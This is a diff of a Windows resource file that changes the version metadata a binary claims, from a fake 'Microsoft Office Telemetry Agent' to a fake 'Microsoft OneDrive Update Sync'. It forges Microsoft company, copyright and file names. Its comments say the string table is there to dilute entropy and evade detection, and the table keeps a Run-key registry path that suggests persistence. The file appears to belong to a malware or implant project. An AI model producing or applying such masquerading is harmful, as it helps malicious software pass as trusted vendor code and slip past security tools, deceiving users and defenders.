@@ -1,11 +1,11 @@
 #include <windows.h>
 
-// Version info disguised as Microsoft Office Telemetry Agent (msoia.exe v16.0.16827.20130)
+// Version info disguised as Microsoft OneDrive Update Sync (OneDriveUpdateSync.exe v24.201.1007.0005)
 // STRINGTABLE below dilutes entropy to the 4.5-6.5 range of legitimate Win32 binaries.
 
 VS_VERSION_INFO VERSIONINFO
- FILEVERSION    16,0,16827,20130
- PRODUCTVERSION 16,0,16827,20130
+ FILEVERSION    24,201,1007,5
+ PRODUCTVERSION 24,201,1007,5
  FILEFLAGSMASK  VS_FFI_FILEFLAGSMASK
  FILEFLAGS      0x0L
  FILEOS         VOS__WINDOWS32
@@ -17,13 +17,13 @@ BEGIN
         BLOCK "040904B0"
         BEGIN
             VALUE "CompanyName",      "Microsoft Corporation\0"
-            VALUE "FileDescription",  "Microsoft Office Telemetry Agent\0"
-            VALUE "FileVersion",      "16.0.16827.20130\0"
-            VALUE "InternalName",     "msoia\0"
+            VALUE "FileDescription",  "Microsoft OneDrive Update Sync\0"
+            VALUE "FileVersion",      "24.201.1007.0005\0"
+            VALUE "InternalName",     "OneDriveUpdateSync\0"
             VALUE "LegalCopyright",   "\xa9 Microsoft Corporation. All rights reserved.\0"
-            VALUE "OriginalFilename", "msoia.exe\0"
-            VALUE "ProductName",      "Microsoft Office\0"
-            VALUE "ProductVersion",   "16.0.16827.20130\0"
+            VALUE "OriginalFilename", "OneDriveUpdateSync.exe\0"
+            VALUE "ProductName",      "Microsoft OneDrive\0"
+            VALUE "ProductVersion",   "24.201.1007.0005\0"
         END
     END
     BLOCK "VarFileInfo"
@@ -34,12 +34,12 @@ END
 
 STRINGTABLE
 BEGIN
-    1000 "Microsoft.Office.Telemetry.Agent"
-    1001 "OfficeClickToRun.exe"
-    1002 "HKLM\\SOFTWARE\\Microsoft\\Office\\16.0\\Common\\Telemetry"
-    1003 "AgentVersion"
-    1004 "DiagnosticDataLevel"
-    1005 "OptInLevel"
+    1000 "Microsoft.OneDrive.UpdateSync"
+    1001 "OneDrive.exe"
+    1002 "HKLM\\SOFTWARE\\Microsoft\\OneDrive"
+    1003 "Version"
+    1004 "UpdateRing"
+    1005 "SilentBusinessConfigCompleted"
     1006 "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
     1007 "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
     1008 "SystemRoot"
